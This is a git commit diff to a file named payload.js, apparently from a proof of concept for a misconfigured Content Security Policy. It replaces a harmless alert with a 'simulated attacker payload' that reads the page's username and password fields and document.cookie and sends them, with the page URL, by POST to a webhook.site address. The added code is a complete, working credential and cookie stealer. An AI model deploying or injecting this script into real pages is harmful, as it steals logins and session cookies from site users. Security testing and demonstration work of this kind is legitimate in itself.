d12e23b4b089f3352ab00a78e514de93d363eb2d
Aryan Parashar <160344522+Aryan-Parashar@users.noreply.github.com>
2025-06-27 07:49:24 +0530

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,2 +1,14 @@
-alert("PoC Success: External script executed!");
-document.body.innerHTML = "<h1>CSP is misconfigured! External JS executed.</h1>";
+// Simulated attacker payload
+const username = document.querySelector('input[type=text]')?.value;
+const password = document.querySelector('input[type=password]')?.value;
+
+fetch('https://webhook.site/389656c6-21f4-4d3d-a0d9-778a6799c4e0', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    site: document.location.href,
+    username: username,
+    password: password,
+    cookies: document.cookie
+  })
+});
